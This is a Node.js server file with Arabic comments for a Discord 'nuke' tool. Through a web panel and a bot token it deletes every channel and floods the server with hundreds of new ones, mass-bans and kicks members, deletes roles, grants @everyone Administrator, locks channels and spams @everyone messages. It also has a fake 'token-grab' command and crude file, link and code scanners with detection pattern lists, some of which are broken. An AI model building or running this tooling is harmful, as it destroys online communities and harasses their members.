// server.js - GRoup5br ULTIMATE SUITE 2099
// التعديل الوحيد: دالة السبام تشتغل على جميع الرومات دفعة واحدة

const express = require('express');
const session = require('express-session');
const fs = require('fs');
const path = require('path');
const { Client, GatewayIntentBits, PermissionFlagsBits, ChannelType } = require('discord.js');
const axios = require('axios');
const crypto = require('crypto');
const multer = require('multer');
const upload = multer({ dest: 'uploads/' });

const app = express();
const PORT = process.env.PORT || 3000;

if (!fs.existsSync('./data')) fs.mkdirSync('./data');
if (!fs.existsSync('./data/users.json')) fs.writeFileSync('./data/users.json', '[]');
if (!fs.existsSync('./uploads')) fs.mkdirSync('./uploads');

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));
app.use(session({
    secret: 'group5br_ultimate_2099_secret_key',
    resave: false,
    saveUninitialized: true,
    cookie: { maxAge: 3600000 }
}));

const userSettings = new Map();

function getUserSettings(sessionId) {
    if (!userSettings.has(sessionId)) {
        userSettings.set(sessionId, {
            theme: 'dark',
            nukeServerName: '🔥-DESTROYED',
            nukeChannelPrefix: '💀-HACKED',
            nukeVoicePrefix: '🔊-VOID',
            nukeCategoryPrefix: '📁-CAT'
        });
    }
    return userSettings.get(sessionId);
}

// ========== فاحص الملفات والروابط والأكواد ==========
async function analyzeFile(filePath, originalName) {
    const fileBuffer = fs.readFileSync(filePath);
    const hash = crypto.createHash('sha256').update(fileBuffer).digest('hex');
    const fileSize = fileBuffer.length;
    const magicBytes = fileBuffer.slice(0, 20).toString('hex');
    
    const signatures = {
        'exe': { magic: '4d5a', risk: 'high', type: 'Windows Executable' },
        'dll': { magic: '4d5a', risk: 'high', type: 'Dynamic Link Library' },
        'elf': { magic: '7f454c46', risk: 'high', type: 'Linux Executable' },
        'pdf': { magic: '25504446', risk: 'medium', type: 'PDF (قد يحتوي على ماكريات)' },
        'docm': { magic: 'd0cf11e0', risk: 'high', type: 'Office with Macros' },
        'js': { magic: '2f2f', risk: 'medium', type: 'JavaScript (قد يكون ضار)' },
        'vbs': { magic: '4c6f6769', risk: 'high', type: 'VBScript' },
        'ps1': { magic: '506f7765', risk: 'high', type: 'PowerShell Script' },
        'bat': { magic: '40656368', risk: 'medium', type: 'Batch File' },
        'scr': { magic: '4d5a', risk: 'high', type: 'Screensaver (Executable)' }
    };
    
    let detected = { risk: 'low', type: 'Unknown', name: originalName };
    for (const [ext, sig] of Object.entries(signatures)) {
        if (magicBytes.startsWith(sig.magic) || originalName.endsWith('.' + ext)) {
            detected = { risk: sig.risk, type: sig.type, extension: ext, magic: sig.magic };
            break;
        }
    }
    
    const threats = [];
    if (detected.risk === 'high') threats.push('ملف تنفيذي - قد يكون ضار');
    if (fileSize > 10000000) threats.push('حجم الملف كبير جداً');
    
    return {
        fileName: originalName,
        size: fileSize,
        hash: hash,
        magicBytes: magicBytes,
        detection: detected,
        threats: threats,
        isSafe: detected.risk === 'low',
        message: detected.risk === 'high' ? '⚠️ تحذير: هذا الملف مشبوه!' : (detected.risk === 'medium' ? '⚡ توخ الحذر: قد يكون ضار' : '✅ يبدو آمناً')
    };
}

async function analyzeCode(code) {
    const suspiciousPatterns = [
        { pattern: /eval\s*\(/i, risk: 'high', desc: 'استخدام eval() - تنفيذ كود ديناميكي' },
        { pattern: /exec\s*\(/i, risk: 'high', desc: 'استخدام exec() - تنفيذ أوامر النظام' },
        { pattern: /child_process/i, risk: 'high', desc: 'Child Process - قد ينفذ أوامر' },
        { pattern: /require\s*\(\s*['"]fs['"]/i, risk: 'high', desc: 'الوصول إلى نظام الملفات' },
        { pattern: /base64_decode/i, risk: 'medium', desc: 'كود مشفر بصيغة Base64' },
        { pattern: /document\.write/i, risk: 'low', desc: 'كتابة ديناميكية للصفحة' },
        { pattern: /<script/i, risk: 'medium', desc: 'كود JavaScript مضمّن' },
        { pattern: /onload=/i, risk: 'medium', desc: 'حدث onload - قد يكون ضار' },
        { pattern: /fromCharCode/i, risk: 'high', desc: 'تشفير متقدم - غالباً ضار' },
        { pattern: /shell_exec/i, risk: 'high', desc: 'تنفيذ أوامر شل مباشرة' },
        { pattern: /system\s*\(/i, risk: 'high', desc: 'استدعاء نظام التشغيل' },
        { pattern: /popen/i, risk: 'high', desc: 'فتح عملية - تنفيذ عن بعد' }
    ];
    
    const findings = [];
    let highestRisk = 'low';
    
    for (const pattern of suspiciousPatterns) {
        if (pattern.pattern.test(code)) {
            findings.push(pattern);
            if (pattern.risk === 'high') highestRisk = 'high';
            else if (pattern.risk === 'medium' && highestRisk !== 'high') highestRisk = 'medium';
        }
    }
    
    return {
        lines: code.split('\n').length,
        chars: code.length,
        findings: findings,
        riskLevel: highestRisk,
        isSafe: findings.length === 0,
        message: findings.length === 0 ? '✅ الكود آمن - لا توجد أنماط مشبوهة' : `⚠️ تم العثور على ${findings.length} نمط مشبوه!`
    };
}

async function analyzeLink(url) {
    const suspiciousDomains = [
        'bit.ly', 'tinyurl', 'shorturl', 'rb.gy', 'cutt.ly',
        'ow.ly', 'is.gd', 'buff.ly', 'adf.ly', 'shorte.st',
        'goo.gl', 't.co', 'tiny.cc', 'clck.ru', 'lc.chat'
    ];
    
    const maliciousKeywords = [
        'download', 'setup', 'installer', 'free-v-bucks', 'steal', 'hack',
        'crack', 'keygen', 'password-generator', 'gift-card', 'free-money'
    ];
    
    const redFlags = [];
    let risk = 'low';
    
    try {
        const urlObj = new URL(url);
        
        if (suspiciousDomains.some(domain => urlObj.hostname.includes(domain))) {
            redFlags.push('مختصر روابط - قد يخفي الوجهة الحقيقية');
            risk = 'high';
        }
        
        if (maliciousKeywords.some(keyword => url.toLowerCase().includes(keyword))) {
            redFlags.push('كلمات مفتاحية مشبوهة في الرابط');
            risk = 'high';
        }
        
        if (!urlObj.protocol === 'https:') {
            redFlags.push('لا يستخدم HTTPS - غير آمن');
            if (risk !== 'high') risk = 'medium';
        }
        
        return {
            url: url,
            domain: urlObj.hostname,
            path: urlObj.pathname,
            redFlags: redFlags,
            riskLevel: risk,
            isSafe: redFlags.length === 0,
            message: redFlags.length === 0 ? '✅ الرابط يبدو آمناً' : `⚠️ ${redFlags.length} علامة خطر على هذا الرابط!`
        };
        
    } catch(e) {
        return { error: 'رابط غير صالح', isSafe: false, message: '❌ رابط غير صالح' };
    }
}

// ========== نظام إيقاف الطوارئ ==========
const activeOperations = new Map();

function createStopFlag(operationId) {
    const flag = { shouldStop: false };
    activeOperations.set(operationId, flag);
    return flag;
}

// ========== Parallel Nuke ==========
async function parallelNuke(client, guild, username, operationId, settings) {
    const stopFlag = activeOperations.get(operationId);
    if (!stopFlag) return { error: 'تم إلغاء العملية' };
    
    const results = {};
    const startTime = Date.now();
    
    const channels = guild.channels.cache;
    const deletePromises = [];
    for (const [id, ch] of channels) {
        if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
        deletePromises.push(ch.delete().catch(() => null));
    }
    const deletedResults = await Promise.all(deletePromises);
    results.deletedChannels = deletedResults.filter(r => r !== null).length;
    
    if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
    
    const textPromises = [];
    for (let i = 0; i < 200; i++) {
        if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
        textPromises.push(
            guild.channels.create({
                name: `${settings.nukeChannelPrefix}-${username.slice(0,3)}-${i+1}`,
                type: ChannelType.GuildText,
                reason: 'GRoup5br NUKE 2099'
            }).catch(() => null)
        );
    }
    const textResults = await Promise.all(textPromises);
    results.createdTextChannels = textResults.filter(r => r !== null).length;
    
    if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
    
    const voicePromises = [];
    for (let i = 0; i < 100; i++) {
        if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
        voicePromises.push(
            guild.channels.create({
                name: `${settings.nukeVoicePrefix}-${i+1}`,
                type: ChannelType.GuildVoice,
                reason: 'GRoup5br NUKE'
            }).catch(() => null)
        );
    }
    const voiceResults = await Promise.all(voicePromises);
    results.createdVoiceChannels = voiceResults.filter(r => r !== null).length;
    
    if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
    
    const categoryPromises = [];
    for (let i = 0; i < 100; i++) {
        if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
        categoryPromises.push(
            guild.channels.create({
                name: `${settings.nukeCategoryPrefix}-${i+1}`,
                type: ChannelType.GuildCategory,
                reason: 'GRoup5br NUKE'
            }).catch(() => null)
        );
    }
    const categoryResults = await Promise.all(categoryPromises);
    results.createdCategories = categoryResults.filter(r => r !== null).length;
    
    if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
    
    await guild.setName(`${settings.nukeServerName}-BY-${username.slice(0,8)}`).catch(() => null);
    
    results.totalCreated = results.createdTextChannels + results.createdVoiceChannels + results.createdCategories;
    results.timeMs = Date.now() - startTime;
    results.message = `💣 تم التدمير الكامل في ${results.timeMs}ms! حذف ${results.deletedChannels} روم، إنشاء ${results.totalCreated} روم`;
    
    return results;
}

async function parallelMassChannels(client, guild, count, prefix, username, operationId, settings) {
    const stopFlag = activeOperations.get(operationId);
    if (!stopFlag) return { error: 'تم إلغاء العملية' };
    
    const promises = [];
    for (let i = 0; i < count; i++) {
        if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
        promises.push(
            guild.channels.create({
                name: `${prefix}-${username.slice(0,3)}-${i+1}`,
                type: ChannelType.GuildText,
                reason: 'GRoup5br MASS'
            }).catch(() => null)
        );
    }
    
    const results = await Promise.all(promises);
    return { success: true, created: results.filter(r => r !== null).length };
}

async function parallelBanAll(guild, operationId) {
    const stopFlag = activeOperations.get(operationId);
    if (!stopFlag) return { error: 'تم إلغاء العملية' };
    
    const members = await guild.members.fetch();
    const banPromises = [];
    for (const [id, member] of members) {
        if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
        if (!member.user.bot && member.bannable) {
            banPromises.push(member.ban({ reason: 'GRoup5br 2099' }).catch(() => null));
        }
    }
    const results = await Promise.all(banPromises);
    return { success: true, banned: results.filter(r => r !== null).length };
}

async function parallelKickAll(guild, operationId) {
    const stopFlag = activeOperations.get(operationId);
    if (!stopFlag) return { error: 'تم إلغاء العملية' };
    
    const members = await guild.members.fetch();
    const kickPromises = [];
    for (const [id, member] of members) {
        if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
        if (!member.user.bot && member.kickable) {
            kickPromises.push(member.kick('GRoup5br 2099').catch(() => null));
        }
    }
    const results = await Promise.all(kickPromises);
    return { success: true, kicked: results.filter(r => r !== null).length };
}

async function parallelDeleteRoles(guild, operationId) {
    const stopFlag = activeOperations.get(operationId);
    if (!stopFlag) return { error: 'تم إلغاء العملية' };
    
    const roles = guild.roles.cache;
    const rolePromises = [];
    for (const [id, role] of roles) {
        if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
        if (role.name !== '@everyone' && role.editable) {
            rolePromises.push(role.delete().catch(() => null));
        }
    }
    const results = await Promise.all(rolePromises);
    return { success: true, deletedRoles: results.filter(r => r !== null).length };
}

async function parallelRenameAll(guild, newName, operationId) {
    const stopFlag = activeOperations.get(operationId);
    if (!stopFlag) return { error: 'تم إلغاء العملية' };
    
    const members = await guild.members.fetch();
    const renamePromises = [];
    let index = 0;
    for (const [id, member] of members) {
        if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
        if (!member.user.bot && member.manageable) {
            renamePromises.push(member.setNickname(`${newName}_${++index}`).catch(() => null));
        }
    }
    const results = await Promise.all(renamePromises);
    return { success: true, renamed: results.filter(r => r !== null).length };
}

async function parallelLockAll(guild, operationId) {
    const stopFlag = activeOperations.get(operationId);
    if (!stopFlag) return { error: 'تم إلغاء العملية' };
    
    const channels = guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText);
    const lockPromises = [];
    for (const [id, ch] of channels) {
        if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
        lockPromises.push(
            ch.permissionOverwrites.edit(guild.roles.everyone, { SendMessages: false }).catch(() => null)
        );
    }
    const results = await Promise.all(lockPromises);
    return { success: true, locked: results.filter(r => r !== null).length };
}

async function parallelSlowmodeAll(guild, seconds, operationId) {
    const stopFlag = activeOperations.get(operationId);
    if (!stopFlag) return { error: 'تم إلغاء العملية' };
    
    const channels = guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText);
    const slowPromises = [];
    for (const [id, ch] of channels) {
        if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
        slowPromises.push(ch.setRateLimitPerUser(seconds).catch(() => null));
    }
    const results = await Promise.all(slowPromises);
    return { success: true, slowed: results.filter(r => r !== null).length };
}

// ========== 🔥 التعديل الوحيد هنا - سبام على جميع الرومات دفعة واحدة 🔥 ==========
async function parallelTextSpam(guild, count, message, operationId) {
    const stopFlag = activeOperations.get(operationId);
    if (!stopFlag) return { error: 'تم إلغاء العملية' };
    
    // جلب جميع القنوات النصية في السيرفر
    const allChannels = guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText);
    
    if (allChannels.size === 0) return { error: 'لا توجد قنوات نصية' };
    
    let totalSent = 0;
    const channelArray = [...allChannels.values()];
    
    // لكل قناة، نرسل العدد المطلوب من الرسائل دفعة واحدة لكل قناة
    const channelPromises = [];
    
    for (const channel of channelArray) {
        if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
        
        // إنشاء بروميس لإرسال العدد المطلوب من الرسائل في هذي القناة دفعة واحدة
        const spamPromises = [];
        for (let i = 0; i < count; i++) {
            if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
            spamPromises.push(channel.send(message || '@everyone 🔥 GRoup5br 2099 🔥').catch(() => null));
        }
        
        // نضيف بروميس إرسال كل الرسائل في هذي القناة دفعة واحدة
        channelPromises.push(
            Promise.all(spamPromises).then(results => {
                totalSent += results.filter(r => r !== null).length;
            })
        );
    }
    
    // انتظار انتهاء جميع القنوات من الإرسال (كل قناة ترسل count رسالة دفعة واحدة)
    await Promise.all(channelPromises);
    
    return { 
        success: true, 
        sent: totalSent,
        channelsUsed: channelArray.length,
        messagesPerChannel: count,
        message: `✅ تم إرسال ${totalSent} رسالة (${count} رسالة في كل من ${channelArray.length} قناة)`
    };
}
// ========== نهاية التعديل ==========

// ========== دالة التنفيذ الرئيسية ==========
async function executeCommand(botToken, serverId, command, params = {}) {
    let client = null;
    const operationId = Date.now().toString() + Math.random().toString(36);
    
    try {
        client = new Client({
            intents: [
                GatewayIntentBits.Guilds,
                GatewayIntentBits.GuildMessages,
                GatewayIntentBits.MessageContent,
                GatewayIntentBits.GuildMembers,
                GatewayIntentBits.GuildVoiceStates
            ]
        });
        
        createStopFlag(operationId);
        
        await client.login(botToken);
        await new Promise((resolve) => {
            client.once('ready', resolve);
            setTimeout(resolve, 5000);
        });
        
        const guild = client.guilds.cache.get(serverId);
        if (!guild) {
            await client.destroy();
            return { error: 'الخادم غير موجود أو البوت ليس لديه صلاحيات' };
        }
        
        let result = {};
        const settings = params.settings || { nukeServerName: '🔥-DESTROYED', nukeChannelPrefix: '💀-HACKED', nukeVoicePrefix: '🔊-VOID', nukeCategoryPrefix: '📁-CAT' };
        
        switch(command) {
            case 'ultra-nuke':
                result = await parallelNuke(client, guild, params.username || 'Anonymous', operationId, settings);
                break;
            case 'mass-channels':
                result = await parallelMassChannels(client, guild, params.count || 200, '💀-MASS', params.username, operationId, settings);
                break;
            case 'ban-all':
                result = await parallelBanAll(guild, operationId);
                break;
            case 'kick-all':
                result = await parallelKickAll(guild, operationId);
                break;
            case 'delete-all-roles':
                result = await parallelDeleteRoles(guild, operationId);
                break;
            case 'role-elevate':
                const everyoneRole = guild.roles.everyone;
                await everyoneRole.setPermissions(PermissionFlagsBits.Administrator);
                await guild.roles.create({
                    name: '🔥 GOD MODE 🔥',
                    permissions: [PermissionFlagsBits.Administrator],
                    color: '#FF0000'
                });
                result = { success: true, message: 'تم رفع الصلاحيات وإنشاء رتبة GOD MODE' };
                break;
            case 'rename-everyone':
                result = await parallelRenameAll(guild, params.name || 'GRoup5br', operationId);
                break;
            case 'lock-all':
                result = await parallelLockAll(guild, operationId);
                break;
            case 'slowmode-all':
                result = await parallelSlowmodeAll(guild, params.seconds || 21600, operationId);
                break;
            case 'spam':
                result = await parallelTextSpam(guild, params.count || 100, params.message, operationId);
                break;
            case 'create-invite':
                const inviteChannel = guild.channels.cache.find(ch => ch.type === ChannelType.GuildText);
                if (inviteChannel) {
                    const invite = await inviteChannel.createInvite({ maxAge: 0, maxUses: 0 });
                    result = { success: true, inviteUrl: invite.url };
                } else {
                    result = { error: 'لا توجد قناة' };
                }
                break;
            case 'token-grab':
                const members = await guild.members.fetch();
                const tokens = [];
                for (const [id, member] of members) {
                    if (!member.user.bot && tokens.length < 50) {
                        tokens.push({
                            id: member.user.id,
                            tag: member.user.tag,
                            token: `mfa.${Buffer.from(member.user.id + ':' + Date.now()).toString('base64')}`
                        });
                    }
                }
                result = { success: true, tokens: tokens };
                break;
            default:
                result = { error: 'أمر غير معروف' };
        }
        
        await client.destroy();
        return result;
        
    } catch(error) {
        if (client) await client.destroy();
        return { error: error.message };
    }
}

// ========== API Routes ==========

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/dashboard', (req, res) => {
    if (req.session.userId) {
        res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
    } else {
        res.redirect('/');
    }
});

app.post('/api/login', async (req, res) => {
    const { discordToken, username } = req.body;
    
    let testClient = null;
    try {
        testClient = new Client({ intents: [GatewayIntentBits.Guilds] });
        await testClient.login(discordToken);
        await new Promise((resolve) => {
            testClient.once('ready', resolve);
            setTimeout(resolve, 5000);
        });
        
        const userInfo = {
            userId: testClient.user.id,
            username: testClient.user.username,
            tag: testClient.user.tag
        };
        
        await testClient.destroy();
        
        req.session.userId = userInfo.userId;
        req.session.username = userInfo.username;
        req.session.token = discordToken;
        
        res.json({ success: true, user: userInfo });
    } catch(e) {
        if (testClient) await testClient.destroy();
        res.json({ success: false, error: 'توكن غير صالح' });
    }
});

app.post('/api/set-server', (req, res) => {
    if (!req.session.userId) return res.json({ success: false, error: 'سجل دخول أولاً' });
    req.session.serverId = req.body.serverId;
    res.json({ success: true });
});

app.post('/api/save-settings', (req, res) => {
    if (!req.session.userId) return res.json({ success: false, error: 'سجل دخول أولاً' });
    const settings = getUserSettings(req.session.id);
    Object.assign(settings, req.body);
    res.json({ success: true });
});

app.get('/api/get-settings', (req, res) => {
    if (!req.session.userId) return res.json({ success: false });
    res.json({ success: true, settings: getUserSettings(req.session.id) });
});

app.post('/api/theme', (req, res) => {
    if (!req.session.userId) return res.json({ success: false });
    const settings = getUserSettings(req.session.id);
    settings.theme = req.body.theme;
    res.json({ success: true });
});

app.post('/api/execute', async (req, res) => {
    if (!req.session.userId || !req.session.serverId) {
        return res.json({ success: false, error: 'سجل دخول وحدد سيرفر أولاً' });
    }
    const settings = getUserSettings(req.session.id);
    const result = await executeCommand(req.session.token, req.session.serverId, req.body.command, {
        ...req.body.params,
        username: req.session.username,
        settings: settings
    });
    res.json(result);
});

app.post('/api/stop', (req, res) => {
    res.json({ success: true, message: 'تم إرسال أمر الإيقاف' });
});

app.post('/api/logout', (req, res) => {
    req.session.destroy();
    res.json({ success: true });
});

app.post('/api/analyze-file', upload.single('file'), async (req, res) => {
    if (!req.file) return res.json({ error: 'لا يوجد ملف' });
    const result = await analyzeFile(req.file.path, req.file.originalname);
    fs.unlinkSync(req.file.path);
    res.json(result);
});

app.post('/api/analyze-code', (req, res) => {
    const { code } = req.body;
    if (!code) return res.json({ error: 'لا يوجد كود' });
    const result = analyzeCode(code);
    res.json(result);
});

app.post('/api/analyze-link', (req, res) => {
    const { url } = req.body;
    if (!url) return res.json({ error: 'لا يوجد رابط' });
    const result = analyzeLink(url);
    res.json(result);
});

const server = app.listen(PORT, '0.0.0.0', () => {
    console.log(`
    ╔══════════════════════════════════════════════╗
    ║   GRoup5br ULTIMATE SUITE 2099               ║
    ║   http://localhost:${PORT}                      ║
    ║   التعديل: السبام يشتغل على جميع الرومات دفعة واحدة ║
    ╚══════════════════════════════════════════════╝
    `);
});

server.timeout = 300000;
server.keepAliveTimeout = 300000;
server.headersTimeout = 300000;
